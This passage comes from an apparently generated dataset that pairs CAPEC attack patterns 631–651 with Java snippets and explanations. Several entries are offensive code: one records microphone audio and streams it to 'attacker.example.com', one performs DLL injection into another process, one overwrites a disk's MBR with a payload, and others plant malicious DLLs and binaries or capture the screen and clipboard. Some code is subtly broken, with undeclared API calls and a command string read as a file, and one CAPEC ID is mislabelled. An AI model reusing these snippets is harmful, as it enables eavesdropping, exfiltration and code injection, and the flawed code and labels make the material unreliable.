        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class SoundSquattingExample {\n    public static void main(String[] args) {\n        String trustedDomain = \"trusted-site.com\";\n        String userInputDomain = \"trvsted-site.com\"; // SoundSquatting domain\n\n        if (isTrustedDomain(userInputDomain)) {\n            redirectToDomain(userInputDomain);\n        } else {\n            System.out.println(\"Untrusted domain\");\n        }\n    }\n\n    private static boolean isTrustedDomain(String domain) {\n        // CWE-348: Use of Less Trusted Source\n        return domain.equals(\"trusted-site.com\");\n    }\n\n    private static void redirectToDomain(String domain) {\n        try {\n            // CWE-601: URL Redirection to Untrusted Site\n            URL url = new URL(\"http://\" + domain);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            Scanner scanner = new Scanner(connection.getInputStream());\n            while (scanner.hasNext()) {\n                System.out.println(scanner.nextLine());\n            }\n            scanner.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SoundSquatting attack scenario. The code checks if a user-provided domain matches a trusted domain using a simple string comparison (CWE-348: Use of Less Trusted Source). If the domain is considered trusted, it redirects to that domain (CWE-601: URL Redirection to Untrusted Site). The user input domain 'trvsted-site.com' is a sound-alike of 'trusted-site.com', illustrating how an attacker could exploit user confusion to redirect traffic to a malicious site. This example highlights the risks of relying on simple string comparisons for security decisions and the dangers of open redirects."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class HomographAttackExample {\n    public static void main(String[] args) {\n        String userInput = \"http://ex\u0430mple.com\"; // Note: The '\u0430' is a Cyrillic 'a'\n        String trustedDomain = \"http://example.com\";\n\n        if (isValidDomain(userInput, trustedDomain)) {\n            System.out.println(\"Valid domain: \" + userInput);\n        } else {\n            System.out.println(\"Potential homograph attack detected!\");\n        }\n    }\n\n    public static boolean isValidDomain(String userInput, String trustedDomain) {\n        // Regular expression to match the trusted domain\n        String regex = \"^http://example\\.com$\";\n        Pattern pattern = Pattern.compile(regex);\n        Matcher matcher = pattern.matcher(userInput);\n\n        return matcher.matches();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a homograph attack using homoglyphs. The user input contains a domain name 'http://ex\u0430mple.com' where the '\u0430' is a Cyrillic 'a', which visually appears similar to the Latin 'a' in 'http://example.com'. The code uses a regular expression to validate the user input against the trusted domain. However, the regular expression does not account for homoglyphs, leading to a potential security vulnerability. This example highlights the importance of properly distinguishing visually similar characters to prevent homograph attacks. The code also touches on CWE-1007 (Insufficient Visual Distinction of Homoglyphs Presented to User) and CWE-777 (Regular Expression without Anchors)."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class TokenImpersonationExample {\n    private static Map<String, String> userTokens = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user login and token generation\n        String userId = \"user123\";\n        String token = generateToken(userId);\n        userTokens.put(userId, token);\n\n        // Simulate token impersonation\n        String impersonatedToken = \"fakeToken\";\n        if (authenticateUser(userId, impersonatedToken)) {\n            System.out.println(\"User authenticated with impersonated token!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static String generateToken(String userId) {\n        // Weak token generation logic\n        return \"tokenFor\" + userId;\n    }\n\n    private static boolean authenticateUser(String userId, String token) {\n        // Improper authentication check\n        return userTokens.containsKey(userId) && userTokens.get(userId).equals(token);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of token impersonation. The `generateToken` method creates a weak token based on the user ID, and the `authenticateUser` method performs an improper authentication check. The main method simulates a user login and token generation, followed by an attempt to authenticate using an impersonated token. The code highlights vulnerabilities such as weak token generation (CWE-1270), improper authentication (CWE-287), and weak authentication mechanisms (CWE-1390). The example shows how an adversary could exploit these weaknesses to impersonate a user and gain unauthorized access."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import javax.sound.sampled.*;\nimport java.io.*;\nimport java.net.*;\n\npublic class AudioCapture {\n    public static void main(String[] args) {\n        try {\n            // Define audio format\n            AudioFormat format = new AudioFormat(16000, 16, 2, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n            TargetDataLine microphone = (TargetDataLine) AudioSystem.getLine(info);\n            microphone.open(format);\n            microphone.start();\n\n            // Create a socket to send audio data\n            Socket socket = new Socket(\"attacker.example.com\", 5000);\n            OutputStream out = socket.getOutputStream();\n\n            // Buffer for audio data\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n\n            // Capture and send audio data\n            while ((bytesRead = microphone.read(buffer, 0, buffer.length)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n\n            // Close resources\n            out.close();\n            socket.close();\n            microphone.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet captures audio from the system's microphone and sends it to a remote server. It embodies the main idea of the CAPEC 'Probe Audio and Video Peripherals' by exploiting the system's audio functionality to capture sensitive information. The code uses the javax.sound.sampled package to access the microphone and capture audio data. It then sends this data over a network socket to a specified remote server. This represents CWE-319 (Cleartext Transmission of Sensitive Information) as the audio data is transmitted in cleartext, making it vulnerable to interception. Additionally, it demonstrates CWE-267 (Privilege Defined With Unsafe Actions) as the code assumes the necessary privileges to access the microphone and network resources, which can be exploited for unintended actions."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class FileUpload {\n    public static void main(String[] args) {\n        String userInputFileName = \"example.txt\"; // This should come from user input\n        try {\n            // Check file extension\n            if (userInputFileName.endsWith(\".txt\")) {\n                // Create a file object\n                File file = new File(userInputFileName);\n                // Simulate file upload\n                uploadFile(file);\n            } else {\n                System.out.println(\"Invalid file type.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void uploadFile(File file) throws IOException {\n        // Simulate saving the file to a directory\n        Path path = Paths.get(\"/uploads/\" + file.getName());\n        Files.createFile(path);\n        System.out.println(\"File uploaded to: \" + path.toString());\n    }\n}",
        "description": "This Java code snippet demonstrates a basic file upload mechanism that relies on the file extension to determine if the file should be processed. The code checks if the user-supplied file name ends with '.txt' before proceeding with the upload. This approach is vulnerable to attacks where an attacker could deceive the system by using a file name with a misleading extension. For example, a file named 'malicious.txt.exe' could bypass the check and be executed as an executable file, leading to potential security risks such as code execution, denial of service, or exposure of sensitive information. The code also constructs the file path using user input without proper validation, which could lead to path traversal attacks."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class MaliciousFileHider {\n    public static void main(String[] args) {\n        try {\n            // Create a normal file\n            File file = new File(\"example.txt\");\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Write normal content to the file\n            FileOutputStream fos = new FileOutputStream(file);\n            fos.write(\"This is a normal file content.\".getBytes());\n            fos.close();\n\n            // Hide malicious data in the file's metadata\n            String maliciousData = \"<script>alert('Malicious Code');</script>\";\n            Files.setAttribute(Paths.get(\"example.txt\"), \"user:maliciousData\", maliciousData.getBytes());\n\n            // Read the hidden malicious data (for demonstration purposes)\n            byte[] hiddenData = (byte[]) Files.getAttribute(Paths.get(\"example.txt\"), \"user:maliciousData\");\n            System.out.println(\"Hidden Malicious Data: \" + new String(hiddenData));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker can hide malicious data within a file's metadata. The code creates a normal text file and writes some benign content to it. Then, it hides a malicious script within the file's metadata using the `Files.setAttribute` method. This hidden data is not visible during the normal use of the file, making it difficult to discover. The code also includes a demonstration of how to read the hidden malicious data. This example embodies the main idea of CAPEC-165 (Hiding Malicious Data or Code within Files) and relates to CWE-506 (Embedded Malicious Code) and CWE-515 (Covert Storage Channel)."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import java.awt.datatransfer.Clipboard;\nimport java.awt.datatransfer.DataFlavor;\nimport java.awt.datatransfer.Transferable;\nimport java.awt.Toolkit;\n\npublic class ClipboardDataCollector {\n    public static void main(String[] args) {\n        try {\n            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\n            Transferable contents = clipboard.getContents(null);\n            if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {\n                String clipboardData = (String) contents.getTransferData(DataFlavor.stringFlavor);\n                // Simulate storing sensitive data in cleartext\n                System.out.println(\"Clipboard Data: \" + clipboardData); // CWE-317\n                // Simulate storing sensitive data in an executable\n                String sensitiveData = \"Sensitive Info: \" + clipboardData; // CWE-318\n                // Simulate exposure of sensitive system information\n                System.out.println(\"Sensitive Data: \" + sensitiveData); // CWE-497\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in the CAPEC 'Collect Data from Clipboard'. The code accesses the system clipboard and retrieves any text data available. It then prints the clipboard data to the console, simulating the storage of sensitive information in cleartext within the GUI (CWE-317) and in an executable (CWE-318). Additionally, it exposes sensitive system information to unauthorized control spheres (CWE-497). This example highlights how an application can inadvertently allow an adversary to collect sensitive information from the clipboard, which can be exploited by malware or other unauthorized applications."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\n\npublic class FirmwareAlteration {\n    private static final String HDD_PATH = \"/dev/sda\";\n    private static final int MBR_SIZE = 512;\n    private static final byte[] MALICIOUS_PAYLOAD = new byte[]{ /* malicious code bytes */ };\n\n    public static void main(String[] args) {\n        try (RandomAccessFile hdd = new RandomAccessFile(HDD_PATH, \"rw\");\n             FileChannel channel = hdd.getChannel()) {\n\n            // Read the original MBR\n            ByteBuffer mbrBuffer = ByteBuffer.allocate(MBR_SIZE);\n            channel.read(mbrBuffer, 0);\n            byte[] originalMBR = mbrBuffer.array();\n\n            // Modify the MBR to include the malicious payload\n            System.arraycopy(MALICIOUS_PAYLOAD, 0, originalMBR, 0, MALICIOUS_PAYLOAD.length);\n\n            // Write the modified MBR back to the HDD\n            mbrBuffer.clear();\n            mbrBuffer.put(originalMBR);\n            mbrBuffer.flip();\n            channel.write(mbrBuffer, 0);\n\n            System.out.println(\"MBR modified successfully.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an attack that modifies the Master Boot Record (MBR) of a hard disk drive (HDD) to include a malicious payload. The code opens the HDD device file, reads the original MBR, modifies it by injecting the malicious payload, and writes the altered MBR back to the HDD. This represents the CAPEC 'Altered Component Firmware' by showing how an adversary could exploit improperly protected firmware to achieve persistence on a system. The code also touches on related CWEs by highlighting the lack of access control and protections for critical boot code in volatile memory."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableFileStorage {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword=12345\";\n        File file = new File(\"/tmp/sensitive_info.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.out.println(\"Sensitive data written to /tmp/sensitive_info.txt\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where sensitive information is stored in a file without proper access controls. The code writes a string containing sensitive data (a user password) to a file located in the /tmp directory. This directory is typically accessible to all users on the system, making the sensitive information vulnerable to unauthorized access. This example embodies the main idea of the CAPEC 'Probe System Files' by showing how improperly protected files can lead to unauthorized information disclosure. The related CWEs are represented as follows: CWE-552 (Files or Directories Accessible to External Parties) by storing the file in a publicly accessible directory, CWE-377 (Insecure Temporary File) by using the /tmp directory for sensitive data, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by not restricting access to the sensitive file."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import com.sun.jna.Library;\nimport com.sun.jna.Native;\nimport com.sun.jna.Pointer;\n\npublic class DLLInjectionExample {\n    public interface Kernel32 extends Library {\n        Kernel32 INSTANCE = Native.load(\"kernel32\", Kernel32.class);\n        Pointer OpenProcess(int dwDesiredAccess, boolean bInheritHandle, int dwProcessId);\n        boolean WriteProcessMemory(Pointer hProcess, Pointer lpBaseAddress, byte[] lpBuffer, int nSize, int[] lpNumberOfBytesWritten);\n        boolean CreateRemoteThread(Pointer hProcess, Pointer lpThreadAttributes, int dwStackSize, Pointer lpStartAddress, Pointer lpParameter, int dwCreationFlags, Pointer lpThreadId);\n    }\n\n    public static void main(String[] args) {\n        int processId = 1234; // Target process ID\n        String dllPath = \"C:\\\\path\\\\to\\\\malicious.dll\";\n\n        Pointer hProcess = Kernel32.INSTANCE.OpenProcess(0x1F0FFF, false, processId);\n        if (hProcess == null) {\n            System.out.println(\"Failed to open process.\");\n            return;\n        }\n\n        byte[] dllBytes = dllPath.getBytes();\n        Pointer allocMem = Kernel32.INSTANCE.VirtualAllocEx(hProcess, null, dllBytes.length, 0x3000, 0x40);\n        if (allocMem == null) {\n            System.out.println(\"Failed to allocate memory.\");\n            return;\n        }\n\n        int[] written = new int[1];\n        boolean writeResult = Kernel32.INSTANCE.WriteProcessMemory(hProcess, allocMem, dllBytes, dllBytes.length, written);\n        if (!writeResult) {\n            System.out.println(\"Failed to write memory.\");\n            return;\n        }\n\n        Pointer loadLibraryAddr = Kernel32.INSTANCE.GetProcAddress(Kernel32.INSTANCE.GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\");\n        if (loadLibraryAddr == null) {\n            System.out.println(\"Failed to get LoadLibrary address.\");\n            return;\n        }\n\n        Pointer remoteThread = Kernel32.INSTANCE.CreateRemoteThread(hProcess, null, 0, loadLibraryAddr, allocMem, 0, null);\n        if (remoteThread == null) {\n            System.out.println(\"Failed to create remote thread.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of DLL injection, which is a form of 'Inclusion of Code in Existing Process' (CAPEC-94). The code uses the Java Native Access (JNA) library to interact with Windows API functions. It opens a target process, allocates memory within that process, writes the path of a malicious DLL to the allocated memory, and then creates a remote thread in the target process to load the malicious DLL. This example embodies CWE-114 (Process Control) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by showing how an attacker can inject and execute arbitrary code within the context of another process, potentially leading to privilege escalation and evasion of detection mechanisms."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class DLLSideLoadingExample {\n    public static void main(String[] args) {\n        String dllName = \"example.dll\";\n        String appDirectory = \"C:\\\\Program Files\\\\ExampleApp\\\\\";\n        String maliciousDllPath = \"C:\\\\Users\\\\Public\\\\malicious.dll\";\n\n        // Simulate DLL side-loading by copying a malicious DLL to the application directory\n        try {\n            Files.copy(Paths.get(maliciousDllPath), Paths.get(appDirectory + dllName), StandardCopyOption.REPLACE_EXISTING);\n            System.out.println(\"Malicious DLL loaded successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of DLL side-loading, where a malicious DLL is placed in the application's directory to be loaded instead of the legitimate one. The code copies a malicious DLL from a public directory to the application's directory, replacing the legitimate DLL. This represents the CAPEC concept of DLL side-loading, where an attacker exploits the search path for DLLs to load a malicious version. The related CWEs are illustrated by the use of an uncontrolled search path (CWE-427) and the potential for using an incorrectly-resolved name or reference (CWE-706)."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableBinaryReplacement {\n    public static void main(String[] args) {\n        String binaryPath = \"/usr/local/bin/importantBinary\";\n        String maliciousBinaryPath = \"/tmp/maliciousBinary\";\n\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        File binaryFile = new File(binaryPath);\n        if (binaryFile.exists() && binaryFile.canWrite()) {\n            try {\n                // CWE-426: Untrusted Search Path\n                // CWE-78: OS Command Injection\n                // CWE-428: Unquoted Search Path or Element\n                // CWE-506: Embedded Malicious Code\n                Files.copy(Paths.get(maliciousBinaryPath), Paths.get(binaryPath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n                System.out.println(\"Binary replaced successfully.\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Binary is not writable or does not exist.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario where an important binary file can be replaced by a malicious binary due to incorrect file permissions. The code checks if the binary file at '/usr/local/bin/importantBinary' exists and is writable (CWE-732). If it is, the code replaces it with a malicious binary located at '/tmp/maliciousBinary' (CWE-426, CWE-78, CWE-428, CWE-506). This represents the CAPEC 'Replace Binaries' attack pattern, where an adversary can replace critical binaries with malware due to weak file system permissions."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class SharedDirectoryScanner {\n    public static void main(String[] args) {\n        String sharedDirPath = \"\\\\UNC\\share\\name\\sensitiveData\";\n        File sharedDir = new File(sharedDirPath);\n\n        if (sharedDir.exists() && sharedDir.isDirectory()) {\n            File[] files = sharedDir.listFiles();\n            if (files != null) {\n                for (File file : files) {\n                    try {\n                        String content = new String(Files.readAllBytes(Paths.get(file.getPath())));\n                        System.out.println(\"Found file: \" + file.getName() + \" with content: \" + content);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        } else {\n            System.out.println(\"Shared directory does not exist or is not a directory.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might identify and access shared files or directories on a system, as described in the CAPEC. The code attempts to access a shared directory using a Windows UNC path (CWE-40) and lists all files within that directory. If the directory exists and contains files, it reads and prints the content of each file. This can expose sensitive information (CWE-200) if the shared directory is not properly secured (CWE-552). The code also highlights the risk of using fixed paths that could be controlled by unintended actors (CWE-427) and the potential for privilege misuse (CWE-267)."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class PassTheHashExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        // Storing user credentials as hashes (CWE-836)\n        String username = \"user1\";\n        String password = \"password123\";\n        String passwordHash = hashPassword(password);\n        userDatabase.put(username, passwordHash);\n\n        // Simulating an attacker capturing the hash (CAPEC-562)\n        String capturedHash = passwordHash;\n\n        // Using the captured hash to authenticate (CWE-294)\n        if (authenticate(username, capturedHash)) {\n            System.out.println(\"Authentication successful using captured hash!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static String hashPassword(String password) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n        byte[] hash = md.digest(password.getBytes());\n        StringBuilder hexString = new StringBuilder();\n        for (byte b : hash) {\n            hexString.append(String.format(\"%02x\", b));\n        }\n        return hexString.toString();\n    }\n\n    private static boolean authenticate(String username, String passwordHash) {\n        // Comparing the captured hash with the stored hash (CWE-836)\n        return userDatabase.containsKey(username) && userDatabase.get(username).equals(passwordHash);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Pass The Hash' attack. It stores user credentials as password hashes (CWE-836) and simulates an attacker capturing one of these hashes. The captured hash is then used to authenticate the user, bypassing the need for the actual password (CAPEC-562). The code highlights the vulnerability of using password hashes for authentication and the risk of capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class VulnerableKerberosServer {\n    private static final int PORT = 8080;\n    private static final String TICKET = \"hardcoded_ticket\"; // CWE-522: Insufficiently Protected Credentials\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                try (Socket clientSocket = serverSocket.accept();\n                     InputStream input = clientSocket.getInputStream();\n                     OutputStream output = clientSocket.getOutputStream()) {\n\n                    byte[] buffer = new byte[1024];\n                    int bytesRead = input.read(buffer);\n                    String receivedTicket = new String(buffer, 0, bytesRead);\n\n                    if (TICKET.equals(receivedTicket)) { // CWE-308: Use of Single-factor Authentication\n                        output.write(\"Access Granted\".getBytes());\n                    } else {\n                        output.write(\"Access Denied\".getBytes());\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable Kerberos-like server that uses a hardcoded ticket for authentication. The server listens on a specified port and grants access if the received ticket matches the hardcoded ticket. This embodies the main idea of the CAPEC 'Use of Captured Tickets (Pass The Ticket)' by demonstrating how an adversary could use a stolen or captured ticket to gain unauthorized access. The code also highlights several related CWEs: CWE-522 (Insufficiently Protected Credentials) by using a hardcoded ticket, CWE-308 (Use of Single-factor Authentication) by relying on a single ticket for authentication, and CWE-294 (Authentication Bypass by Capture-replay) as the ticket could be captured and replayed by an attacker."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.List;\n\npublic class PeripheralFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Example of searching for iOS backups\n            File backupDir = new File(System.getProperty(\"user.home\") + \"/AppData/Roaming/Apple Computer/MobileSync/Backup\");\n            if (backupDir.exists()) {\n                System.out.println(\"iOS backups found:\");\n                for (File file : backupDir.listFiles()) {\n                    System.out.println(file.getName());\n                }\n            }\n\n            // Example of analyzing Windows registry for USB devices\n            List<String> registryOutput = Files.readAllLines(Paths.get(\"C:\\Windows\\System32\\reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\"));\n            System.out.println(\"Connected USB devices:\");\n            for (String line : registryOutput) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Peripheral Footprinting' by attempting to obtain information about attached peripheral devices and components connected to a computer system. The code searches for iOS backups in a typical directory and reads the Windows registry to list connected USB devices. This represents the CAPEC's idea of gathering information about peripherals to gain insights into the system or network environment. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and handling system-level information improperly (CWE-67)."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryDataCollector {\n    public static void main(String[] args) {\n        // Accessing Windows Registry using Java Preferences API\n        Preferences systemRoot = Preferences.systemRoot();\n        Preferences userRoot = Preferences.userRoot();\n\n        // Improper Authorization: No checks for user permissions\n        String sensitiveData = systemRoot.get(\"SensitiveKey\", \"default\");\n        System.out.println(\"Sensitive Data: \" + sensitiveData);\n\n        // Cleartext Storage in the Registry: Storing sensitive data in cleartext\n        userRoot.put(\"SensitiveKey\", \"SensitiveValue\");\n        System.out.println(\"Data stored in registry.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can exploit weaknesses in authorization to gather sensitive information from the Windows Registry. The code uses the Java Preferences API to access both system and user registry roots. It retrieves sensitive data without performing any authorization checks (CWE-285), and stores sensitive information in cleartext within the registry (CWE-314). This example highlights the potential risks of improper authorization and cleartext storage in the registry, which can lead to exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import java.awt.AWTException;\nimport java.awt.Rectangle;\nimport java.awt.Robot;\nimport java.awt.Toolkit;\nimport java.awt.image.BufferedImage;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.imageio.ImageIO;\n\npublic class ScreenCapture {\n    public static void main(String[] args) {\n        try {\n            // Capture the screen\n            Robot robot = new Robot();\n            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());\n            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);\n            \n            // Save the captured image to a file\n            File file = new File(\"screenshot.png\");\n            ImageIO.write(screenFullImage, \"png\", file);\n            System.out.println(\"A full screenshot saved!\");\n        } catch (AWTException | IOException ex) {\n            System.err.println(ex);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary could exploit the system's screen capture functionality to gather sensitive information. The code uses the `Robot` class to capture the entire screen and save it as a PNG file. This action can be leveraged by an attacker to collect sensitive data displayed on the screen, such as passwords, personal information, or other confidential data. The code embodies the CAPEC 'Collect Data from Screen Capture' and highlights CWE-497 'Exposure of Sensitive System Information to an Unauthorized Control Sphere' by showing how sensitive information can be captured and stored without proper authorization or security measures."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileUploadHandler {\n    public static void main(String[] args) {\n        String fileName = \"example.txt \"; // File name with trailing space\n        handleFileUpload(fileName);\n    }\n\n    public static void handleFileUpload(String fileName) {\n        // Check if the file exists\n        File file = new File(fileName);\n        if (file.exists()) {\n            System.out.println(\"File exists: \" + file.getName());\n            // Process the file based on its extension\n            if (fileName.endsWith(\".txt \")) {\n                System.out.println(\"Processing as a text file.\");\n                // Potentially dangerous processing\n            } else {\n                System.out.println(\"Unknown file type.\");\n            }\n        } else {\n            System.out.println(\"File does not exist.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where a file name with a trailing space is not properly sanitized. The `handleFileUpload` method checks if a file exists and processes it based on its extension. However, the file name 'example.txt ' (with a trailing space) can be misclassified, leading to potentially dangerous processing. This embodies the CAPEC idea of adding a space to a file extension to exploit applications that do not properly neutralize trailing special elements in file names. The related CWEs highlight the risks of relying on file names or extensions and the issues with path equivalence due to trailing spaces."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\"); // CWE-434: Unrestricted Upload of File with Dangerous Type\n        String fileName = getFileName(filePart);\n        String uploadPath = getServletContext().getRealPath(\"\") + File.separator + \"uploads\";\n        File uploadDir = new File(uploadPath);\n        if (!uploadDir.exists()) uploadDir.mkdir();\n        File file = new File(uploadPath + File.separator + fileName);\n        try (InputStream fileContent = filePart.getInputStream(); FileOutputStream fos = new FileOutputStream(file)) {\n            int read;\n            final byte[] bytes = new byte[1024];\n            while ((read = fileContent.read(bytes)) != -1) {\n                fos.write(bytes, 0, read);\n            }\n        }\n        // CWE-287: Improper Authentication\n        // No authentication check before allowing file upload\n        response.getWriter().println(\"File uploaded successfully!\");\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality. The servlet allows users to upload files to the server without proper authentication (CWE-287), and it does not restrict the types of files that can be uploaded (CWE-434). The uploaded files are stored in a directory that is accessible via the web server, potentially allowing an attacker to upload a web shell and execute arbitrary commands on the server. This embodies the main idea of the CAPEC 'Upload a Web Shell to a Web Server', where insufficient permissions and improper handling of file uploads can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import javax.sound.sampled.*;\nimport java.io.*;\n\npublic class EavesdroppingExample {\n    public static void main(String[] args) {\n        try {\n            // Obtain and open the microphone line\n            AudioFormat format = new AudioFormat(16000, 8, 2, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n            TargetDataLine microphone = (TargetDataLine) AudioSystem.getLine(info);\n            microphone.open(format);\n            microphone.start();\n\n            // Create a buffer to read the microphone data\n            byte[] buffer = new byte[1024];\n            ByteArrayOutputStream out = new ByteArrayOutputStream();\n\n            // Read data from the microphone and write to the output stream\n            while (true) {\n                int bytesRead = microphone.read(buffer, 0, buffer.length);\n                out.write(buffer, 0, bytesRead);\n\n                // Simulate sending the data over a cleartext channel\n                sendOverCleartextChannel(out.toByteArray());\n                out.reset();\n            }\n        } catch (LineUnavailableException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendOverCleartextChannel(byte[] data) {\n        // Simulate sending data over a cleartext channel\n        System.out.println(\"Sending data: \" + new String(data));\n    }\n}",
